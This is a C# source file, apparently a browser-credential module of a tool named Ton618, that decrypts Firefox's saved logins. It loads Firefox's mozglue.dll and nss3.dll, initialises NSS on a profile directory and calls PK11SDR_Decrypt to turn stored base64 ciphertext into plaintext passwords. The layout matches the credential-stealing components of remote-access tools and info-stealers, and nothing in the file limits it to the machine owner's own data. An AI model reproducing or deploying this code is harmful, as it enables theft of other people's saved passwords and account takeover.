using Everything.Utilities;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Ton618.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Firefox credentials.
    /// </summary>
    public class FFDecryptor : IDisposable
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;

        public long Init(string configDirectory)
        {
            var mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
            Mozglue = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            NSS3 = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
            NSS_Init = ClientNatives.Lookup<NssInit>("nss3.dll", "NSS_Init");
            PK11SDR_Decrypt = ClientNatives.Lookup<Pk11sdrDecrypt>("nss3.dll", "PK11SDR_Decrypt");
            NSS_Shutdown = ClientNatives.Lookup<NssShutdown>("nss3.dll", "NSS_Shutdown");
            return NSS_Init(configDirectory);
        }

        public string Decrypt(string cypherText)
        {
            var ffDataUnmanagedPointer = IntPtr.Zero;
            var sb = new StringBuilder(cypherText);

            try
            {
                var ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                var tSecDec = new TSECItem();
                var item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        var bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
            }

            return null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                NSS_Shutdown();
                ClientNatives.FreeLibrary(NSS3);
                ClientNatives.FreeLibrary(Mozglue);
            }
        }
    }
}
